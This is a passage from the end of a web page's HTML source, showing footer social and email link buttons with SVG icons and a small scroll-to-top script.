aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Twitter" title="Twitter">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:twitter">   <symbol id="ai:lucide:twitter" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6c2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4c-.9-4.2 4-6.6 7-3.8c1.1 0 3-1.2 3-1.2"/></symbol><use href="#ai:lucide:twitter"></use>  </svg>  </a> </li><li> <a href="mailto:zoverin@proton.me" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Email" title="Email">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:mail">   <symbol id="ai:lucide:mail" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect width="20" height="16" x="2" y="4" rx="2"/></g></symbol><use href="#ai:lucide:mail"></use>  </svg>  </a> </li> </ul> </footer> </body></html> <script type="module">document.addEventListener("astro:page-load",()=>{const o=document.getElementById("scroll-to-top"),t=document.querySelector("footer");o&&t&&(o.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("scroll",()=>{const e=t.getBoundingClientRect().top<=window.innerHeight;o.classList.toggle("hidden",window.scrollY<=300||e)}))});</script>